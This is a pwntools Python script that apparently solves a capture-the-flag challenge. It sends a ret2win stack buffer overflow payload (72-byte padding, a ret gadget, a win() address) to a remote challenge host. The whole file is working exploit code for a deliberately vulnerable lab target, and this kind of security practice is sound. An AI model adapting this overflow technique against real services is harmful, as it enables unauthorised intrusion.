#!/usr/bin/env python3

from pwn import *

context.update(arch='amd64', os='linux')


HOST = 'chall_citadel.cryptonitemit.in'
PORT = 56743


win_addr = 0x4011a0   
ret_gadget = 0x40101a  



print(f"win() address: {hex(win_addr)}")
print(f"ret gadget: {hex(ret_gadget)}")
print()

# Connect to remote server
print("connect ti host")
io = remote(HOST, PORT)

# Receive the banner
io.recvuntil(b'cooked.')


# Buffer is 0x48
# Add ret gadget for x64 stack alignment
#  Add win() address 
offset = 72
payload = b'A' * offset
payload += p64(ret_gadget)
payload += p64(win_addr)

print(f"sending offset: {offset}, length: {len(payload)})")
io.sendline(payload)

print("server output : ")
response = io.recvall(timeout=2)

print(response)

print()
print(response.decode('latin-1', errors='ignore'))

io.close()
print("closed and if it reached here itll work i think")
